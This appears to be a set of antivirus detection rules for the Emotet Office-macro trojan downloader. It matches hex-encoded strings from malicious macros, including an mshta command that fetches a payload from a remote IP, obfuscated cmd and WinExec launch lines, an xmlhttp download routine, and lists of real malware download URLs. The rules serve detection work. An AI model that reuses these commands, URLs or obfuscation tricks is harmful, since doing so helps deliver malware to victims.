
rule TrojanDownloader_O97M_Emotet_SS_MTB{
	meta:
		description = "TrojanDownloader:O97M/Emotet.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,01 00 01 00 02 00 00 "
		
	strings :
		$a_01_0 = {63 3a 5c 70 72 6f 67 72 61 6d 64 61 74 61 5c 72 74 79 75 73 64 6a 2e 62 61 74 } //1 c:\programdata\rtyusdj.bat
		$a_01_1 = {63 3a 5c 70 72 6f 67 72 61 6d 64 61 74 61 5c 75 79 6c 63 73 65 6b 6e 2e 62 61 74 } //1 c:\programdata\uylcsekn.bat
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1) >=1
 
}
rule TrojanDownloader_O97M_Emotet_SS_MTB_2{
	meta:
		description = "TrojanDownloader:O97M/Emotet.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,01 00 01 00 02 00 00 "
		
	strings :
		$a_01_0 = {6d 73 68 74 61 20 68 74 74 70 3a 2f 2f 39 31 2e 32 34 30 2e 31 31 38 2e 31 36 38 2f 71 71 71 77 2f 61 61 61 73 2f 73 65 2e 68 74 6d 6c } //1 mshta http://91.240.118.168/qqqw/aaas/se.html
		$a_03_1 = {6d 73 68 74 61 20 68 74 74 70 3a 2f 2f 39 31 2e 32 34 30 2e 31 31 38 2e 31 37 32 2f 90 05 03 05 28 61 2d 7a 29 2f 90 05 03 05 28 61 2d 7a 29 2e 68 74 6d 6c } //1
	condition:
		((#a_01_0  & 1)*1+(#a_03_1  & 1)*1) >=1
 
}
rule TrojanDownloader_O97M_Emotet_SS_MTB_3{
	meta:
		description = "TrojanDownloader:O97M/Emotet.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 "
		
	strings :
		$a_03_0 = {4e 65 78 74 90 0c 02 00 44 6f 20 57 68 69 6c 65 20 [0-15] 2e 43 72 65 61 74 65 28 4e 75 6c 6c 20 26 20 90 05 0f 06 41 2d 5a 61 2d 7a 2c } //1
		$a_03_1 = {22 73 3a 57 [0-09] 69 [0-09] 6e [0-12] 33 [0-12] 32 [0-12] 5f [0-12] 20 2b 20 } //1
		$a_01_2 = {2e 43 6f 6e 74 72 6f 6c 54 69 70 54 65 78 74 } //1 .ControlTipText
		$a_03_3 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 90 05 0f 06 41 2d 5a 61 2d 7a 29 } //1
	condition:
		((#a_03_0  & 1)*1+(#a_03_1  & 1)*1+(#a_01_2  & 1)*1+(#a_03_3  & 1)*1) >=4
 
}
rule TrojanDownloader_O97M_Emotet_SS_MTB_4{
	meta:
		description = "TrojanDownloader:O97M/Emotet.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 "
		
	strings :
		$a_01_0 = {2e 54 65 78 74 20 3d 20 22 63 77 67 6a 61 6d 64 20 2f 77 67 6a 61 63 20 73 77 67 6a 61 74 61 72 77 67 6a 61 74 2f 77 67 6a 61 42 } //1 .Text = "cwgjamd /wgjac swgjatarwgjat/wgjaB
		$a_03_1 = {3d 20 52 65 70 6c 61 63 65 28 [0-35] 2e 54 65 78 74 42 6f 78 ?? 2e 54 65 78 74 2c 20 22 77 67 6a 61 22 2c 20 22 22 29 } //1
		$a_03_2 = {4f 70 65 6e 20 [0-35] 2e 54 61 67 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23 31 } //1
		$a_03_3 = {50 72 69 6e 74 20 23 31 2c 20 [0-35] 2e 43 6f 6d 62 6f 42 6f 78 31 2e 54 61 67 } //1
	condition:
		((#a_01_0  & 1)*1+(#a_03_1  & 1)*1+(#a_03_2  & 1)*1+(#a_03_3  & 1)*1) >=4
 
}
rule TrojanDownloader_O97M_Emotet_SS_MTB_5{
	meta:
		description = "TrojanDownloader:O97M/Emotet.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
		
	strings :
		$a_01_0 = {3d 20 52 65 70 6c 61 63 65 28 76 62 69 72 37 75 65 67 66 77 69 37 65 67 66 73 38 75 64 67 66 6b 6a 65 67 62 74 6b 2e 54 65 78 74 42 6f 78 34 2e 54 65 78 74 2c 20 22 77 67 6a 61 22 2c 20 22 22 29 } //1 = Replace(vbir7uegfwi7egfs8udgfkjegbtk.TextBox4.Text, "wgja", "")
		$a_01_1 = {54 65 78 74 20 3d 20 22 63 77 67 6a 61 6d 64 20 2f 77 67 6a 61 63 20 73 77 67 6a 61 74 61 72 77 67 6a 61 74 2f 77 67 6a 61 42 } //1 Text = "cwgjamd /wgjac swgjatarwgjat/wgjaB
		$a_01_2 = {2e 54 61 67 20 3d 20 4c 65 66 74 28 64 62 68 73 6b 64 68 76 2e 43 65 6c 6c 28 32 2c 20 31 29 2c 20 4c 65 6e 28 64 62 68 73 6b 64 68 76 2e 43 65 6c 6c 28 32 2c 20 31 29 29 } //1 .Tag = Left(dbhskdhv.Cell(2, 1), Len(dbhskdhv.Cell(2, 1))
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=3
 
}
rule TrojanDownloader_O97M_Emotet_SS_MTB_6{
	meta:
		description = "TrojanDownloader:O97M/Emotet.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 "
		
	strings :
		$a_01_0 = {4f 70 65 6e 20 22 63 3a 5c 70 72 6f 67 72 61 6d 64 61 74 61 5c 31 2e 63 6d 64 22 20 46 6f 72 20 41 70 70 65 6e 64 20 41 73 20 23 31 } //1 Open "c:\programdata\1.cmd" For Append As #1
		$a_01_1 = {57 69 6e 45 78 65 63 20 22 63 3a 5c 70 72 6f 67 72 61 6d 64 61 74 61 5c 31 2e 63 6d 64 22 2c 20 30 } //1 WinExec "c:\programdata\1.cmd", 0
		$a_01_2 = {56 42 5f 4e 61 6d 65 20 3d 20 22 66 72 6d 70 61 67 65 22 } //1 VB_Name = "frmpage"
		$a_03_3 = {50 72 69 6e 74 20 23 31 2c 20 66 72 6d 70 61 67 65 2e 4c 61 62 65 6c 31 2e 43 61 70 74 69 6f 6e [0-03] 6d 5f 46 6f 72 6d 57 69 64 20 3d 20 53 63 61 6c 65 57 69 64 74 68 [0-03] 43 6c 6f 73 65 20 23 31 } //1
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_03_3  & 1)*1) >=4
 
}
rule TrojanDownloader_O97M_Emotet_SS_MTB_7{
	meta:
		description = "TrojanDownloader:O97M/Emotet.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 "
		
	strings :
		$a_01_0 = {6a 69 75 67 69 79 20 3d 20 22 63 22 20 2b 20 68 66 6b 32 77 6a 65 6b 6a 20 26 20 22 3a 5c 70 72 6f 22 20 2b 20 68 66 6b 32 77 6a 65 6b 6a } //1 jiugiy = "c" + hfk2wjekj & ":\pro" + hfk2wjekj
		$a_01_1 = {65 78 74 24 20 3d 20 22 2e 22 20 26 20 53 70 6c 69 74 28 66 69 6c 65 6e 61 6d 65 24 2c 20 22 2e 22 29 28 55 42 6f 75 6e 64 28 53 70 6c 69 74 28 66 69 6c 65 6e 61 6d 65 24 2c 20 22 2e 22 29 29 29 } //1 ext$ = "." & Split(filename$, ".")(UBound(Split(filename$, ".")))
		$a_01_2 = {6a 69 75 67 69 79 20 3d 20 6a 69 75 67 69 79 20 26 20 22 67 72 61 6d 64 22 20 2b 20 68 66 6b 32 77 6a 65 6b 6a 20 2b 20 22 61 74 61 5c 67 74 64 79 79 75 2e 62 22 } //1 jiugiy = jiugiy & "gramd" + hfk2wjekj + "ata\gtdyyu.b"
		$a_01_3 = {6a 69 75 67 69 79 20 3d 20 6a 69 75 67 69 79 20 2b 20 22 61 74 22 } //1 jiugiy = jiugiy + "at"
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1) >=4
 
}
rule TrojanDownloader_O97M_Emotet_SS_MTB_8{
	meta:
		description = "TrojanDownloader:O97M/Emotet.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 04 00 00 "
		
	strings :
		$a_01_0 = {2e 54 65 78 74 20 3d 20 22 63 77 67 6a 61 6d 64 20 2f 77 67 6a 61 63 20 73 77 67 6a 61 74 61 72 77 67 6a 61 74 2f 77 67 6a 61 42 } //2 .Text = "cwgjamd /wgjac swgjatarwgjat/wgjaB
		$a_03_1 = {4f 70 65 6e 20 [0-35] 2e 54 61 67 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23 31 } //1
		$a_01_2 = {4c 6f 67 46 69 6c 65 46 75 6c 6c 4e 61 6d 65 20 3d 20 54 68 69 73 57 6f 72 6b 62 6f 6f 6b 2e 50 61 74 68 20 26 20 22 5c 63 6f 6d 6d 6f 6e 2e 6c 6f 67 } //1 LogFileFullName = ThisWorkbook.Path & "\common.log
		$a_03_3 = {78 6d 6c 68 74 74 70 2e 4f 70 65 6e 20 22 47 45 54 22 2c 20 55 52 4c 24 2c 20 54 72 75 65 3a 20 44 6f 45 76 65 6e 74 73 [0-03] 78 6d 6c 68 74 74 70 2e 53 65 6e 64 3a 20 44 6f 45 76 65 6e 74 73 } //1
	condition:
		((#a_01_0  & 1)*2+(#a_03_1  & 1)*1+(#a_01_2  & 1)*1+(#a_03_3  & 1)*1) >=5
 
}
rule TrojanDownloader_O97M_Emotet_SS_MTB_9{
	meta:
		description = "TrojanDownloader:O97M/Emotet.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,01 00 01 00 05 00 00 "
		
	strings :
		$a_01_0 = {6e 65 77 2e 74 6f 6b 6f 73 61 74 75 2e 63 6f 6d 2f 77 70 2d 61 64 6d 69 6e 2f 51 7a 7a 51 5a 41 49 44 75 42 68 4f 70 6c 77 4f 6e 68 4a 2f } //1 new.tokosatu.com/wp-admin/QzzQZAIDuBhOplwOnhJ/
		$a_01_1 = {76 61 73 69 6c 65 73 74 75 64 69 6f 2e 63 6f 6d 2f 77 70 2d 61 64 6d 69 6e 2f 76 68 38 6f 45 70 72 43 45 33 2f } //1 vasilestudio.com/wp-admin/vh8oEprCE3/
		$a_01_2 = {66 69 6c 6d 79 77 61 70 2e 63 61 73 61 2f 77 70 2d 69 6e 63 6c 75 64 65 73 2f 6d 53 44 4b 4b 79 4f 73 32 31 4e 2f } //1 filmywap.casa/wp-includes/mSDKKyOs21N/
		$a_01_3 = {66 75 6c 6c 6d 61 7a 61 2e 6e 65 77 73 66 72 65 73 68 2e 6e 65 74 2f 78 63 37 30 2d 32 30 30 6b 2f 6c 68 58 58 46 2f } //1 fullmaza.newsfresh.net/xc70-200k/lhXXF/
		$a_01_4 = {63 68 75 67 68 74 61 69 2e 78 79 7a 2f 63 67 69 2d 62 69 6e 2f 72 30 68 4e 72 4a 4d 32 30 6d 47 74 68 67 53 38 2f } //1 chughtai.xyz/cgi-bin/r0hNrJM20mGthgS8/
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1) >=1
 
}
rule TrojanDownloader_O97M_Emotet_SS_MTB_10{
	meta:
		description = "TrojanDownloader:O97M/Emotet.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,01 00 01 00 02 00 00 "
		
	strings :
		$a_03_0 = {57 73 63 72 69 70 74 2e 53 68 65 6c 6c [0-0f] 77 52 70 63 65 73 52 70 63 65 63 72 52 70 63 65 69 70 52 70 63 65 74 52 70 63 65 63 3a 52 70 63 65 5c 52 70 63 65 70 72 52 70 63 65 6f 67 72 52 70 63 65 61 6d 52 70 63 65 64 61 52 70 63 65 74 61 5c 77 65 74 69 64 6a 6b 73 2e 76 52 70 63 65 62 52 70 63 65 73 } //1
		$a_01_1 = {41 43 49 41 61 41 42 30 41 48 51 41 63 41 42 7a 41 44 6f 41 4c 77 41 76 41 47 30 41 62 77 42 75 41 47 55 41 65 51 42 78 41 48 55 41 62 77 42 30 41 47 55 41 4c 67 42 71 41 47 45 41 4c 67 42 6b 41 47 55 41 59 51 42 73 41 48 4d 41 4c 77 42 68 41 48 4d 41 63 77 42 6c 41 48 51 41 63 77 41 76 41 47 6f 41 59 77 42 44 41 48 63 41 65 41 42 32 41 48 55 41 55 77 42 53 41 48 41 41 52 51 42 54 41 44 63 41 56 67 42 6f 41 46 63 41 65 41 42 71 41 43 38 41 } //1 ACIAaAB0AHQAcABzADoALwAvAG0AbwBuAGUAeQBxAHUAbwB0AGUALgBqAGEALgBkAGUAYQBsAHMALwBhAHMAcwBlAHQAcwAvAGoAYwBDAHcAeAB2AHUAUwBSAHAARQBTADcAVgBoAFcAeABqAC8A
	condition:
		((#a_03_0  & 1)*1+(#a_01_1  & 1)*1) >=1
 
}
rule TrojanDownloader_O97M_Emotet_SS_MTB_11{
	meta:
		description = "TrojanDownloader:O97M/Emotet.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,01 00 01 00 05 00 00 "
		
	strings :
		$a_01_0 = {68 74 74 70 73 3a 2f 2f 64 75 76 61 72 6b 61 67 69 74 6c 61 72 69 6d 6f 64 65 6c 6c 65 72 69 2e 63 6f 6d 2f 34 32 68 68 70 2f 67 5a 58 61 6b 68 37 2f } //1 https://duvarkagitlarimodelleri.com/42hhp/gZXakh7/
		$a_01_1 = {68 74 74 70 73 3a 2f 2f 64 6f 6c 70 68 69 6e 77 61 76 65 68 61 76 75 7a 72 6f 62 6f 74 75 2e 63 6f 6d 2f 77 70 2d 69 6e 63 6c 75 64 65 73 2f 52 6d 43 62 76 49 4b 6a 6a 74 6c 42 33 74 61 62 79 50 6f } //1 https://dolphinwavehavuzrobotu.com/wp-includes/RmCbvIKjjtlB3tabyPo
		$a_01_2 = {68 74 74 70 3a 2f 2f 61 6e 69 6d 61 6c 73 61 6e 64 75 73 66 75 6a 61 69 72 61 68 2e 63 6f 6d 2f 77 70 2d 61 64 6d 69 6e 2f 4a 57 4f 35 38 7a 65 55 4f 77 53 49 } //1 http://animalsandusfujairah.com/wp-admin/JWO58zeUOwSI
		$a_01_3 = {68 74 74 70 73 3a 2f 2f 68 61 76 75 7a 6b 61 79 64 69 72 61 6b 6c 61 72 69 2e 63 6f 6d 2f 77 70 2d 69 6e 63 6c 75 64 65 73 2f 59 71 59 64 4c 46 41 2f } //1 https://havuzkaydiraklari.com/wp-includes/YqYdLFA/
		$a_01_4 = {68 74 74 70 3a 2f 2f 76 69 70 77 61 74 63 68 70 61 79 2e 63 6f 6d 2f 49 73 6f 65 74 61 6c 65 73 2f 35 77 79 38 4c 30 54 51 31 78 43 5a 45 72 } //1 http://vipwatchpay.com/Isoetales/5wy8L0TQ1xCZEr
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1) >=1
 
}
rule TrojanDownloader_O97M_Emotet_SS_MTB_12{
	meta:
		description = "TrojanDownloader:O97M/Emotet.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,01 00 01 00 04 00 00 "
		
	strings :
		$a_01_0 = {74 22 26 22 74 22 26 22 70 22 26 22 73 3a 2f 2f 6e 22 26 22 65 22 26 22 77 22 26 22 6b 22 26 22 61 22 26 22 6e 22 26 22 6f 2e 63 22 26 22 6f 22 26 22 6d 2f 77 22 26 22 70 2d 61 22 26 22 64 22 26 22 6d 22 26 22 69 22 26 22 6e 2f 36 22 26 22 36 22 26 22 72 22 26 22 49 22 26 22 73 22 26 22 72 22 26 22 56 22 26 22 77 22 26 22 6f 22 26 22 50 22 26 22 4b 22 26 22 55 22 26 22 73 22 26 22 6a 22 26 22 63 22 26 22 41 22 26 22 73 } //1 t"&"t"&"p"&"s://n"&"e"&"w"&"k"&"a"&"n"&"o.c"&"o"&"m/w"&"p-a"&"d"&"m"&"i"&"n/6"&"6"&"r"&"I"&"s"&"r"&"V"&"w"&"o"&"P"&"K"&"U"&"s"&"j"&"c"&"A"&"s
		$a_01_1 = {74 22 26 22 74 22 26 22 70 3a 2f 2f 6f 22 26 22 63 22 26 22 61 22 26 22 6c 22 26 22 6f 22 26 22 67 22 26 22 75 22 26 22 6c 22 26 22 6c 22 26 22 61 22 26 22 72 22 26 22 69 2e 63 22 26 22 6f 22 26 22 6d 2f 69 22 26 22 6e 22 26 22 63 2f 57 22 26 22 63 22 26 22 6d 22 26 22 38 22 26 22 32 22 26 22 65 22 26 22 6e 22 26 22 72 22 26 22 73 } //1 t"&"t"&"p://o"&"c"&"a"&"l"&"o"&"g"&"u"&"l"&"l"&"a"&"r"&"i.c"&"o"&"m/i"&"n"&"c/W"&"c"&"m"&"8"&"2"&"e"&"n"&"r"&"s
		$a_01_2 = {74 22 26 22 74 70 22 26 22 73 3a 2f 2f 6d 22 26 22 79 70 22 26 22 68 22 26 22 61 22 26 22 6d 22 26 22 63 22 26 22 75 22 26 22 61 22 26 22 74 22 26 22 75 22 26 22 69 2e 63 22 26 22 6f 22 26 22 6d 2f 61 22 26 22 73 22 26 22 73 22 26 22 65 22 26 22 74 22 26 22 73 2f 4f 22 26 22 50 22 26 22 56 22 26 22 65 22 26 22 56 22 26 22 53 22 26 22 70 22 26 22 4f 2f } //1 t"&"tp"&"s://m"&"yp"&"h"&"a"&"m"&"c"&"u"&"a"&"t"&"u"&"i.c"&"o"&"m/a"&"s"&"s"&"e"&"t"&"s/O"&"P"&"V"&"e"&"V"&"S"&"p"&"O/
		$a_01_3 = {74 22 26 22 74 22 26 22 70 3a 2f 2f 73 22 26 22 69 22 26 22 65 22 26 22 75 22 26 22 74 22 26 22 68 22 26 22 69 22 26 22 70 22 26 22 68 22 26 22 75 22 26 22 74 22 26 22 75 22 26 22 6e 22 26 22 67 22 26 22 78 22 26 22 65 22 26 22 6e 22 26 22 61 22 26 22 6e 22 26 22 67 2e 63 22 26 22 6f 22 26 22 6d 2f 6f 22 26 22 6c 22 26 22 64 5f 73 22 26 22 6f 22 26 22 75 22 26 22 72 22 26 22 63 22 26 22 65 2f 39 22 26 22 62 22 26 22 6f 22 26 22 4a 22 26 22 51 22 26 22 5a 22 26 22 70 22 26 22 54 22 26 22 53 22 26 22 64 22 26 22 51 22 26 22 45 2f } //1 t"&"t"&"p://s"&"i"&"e"&"u"&"t"&"h"&"i"&"p"&"h"&"u"&"t"&"u"&"n"&"g"&"x"&"e"&"n"&"a"&"n"&"g.c"&"o"&"m/o"&"l"&"d_s"&"o"&"u"&"r"&"c"&"e/9"&"b"&"o"&"J"&"Q"&"Z"&"p"&"T"&"S"&"d"&"Q"&"E/
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1) >=1
 
}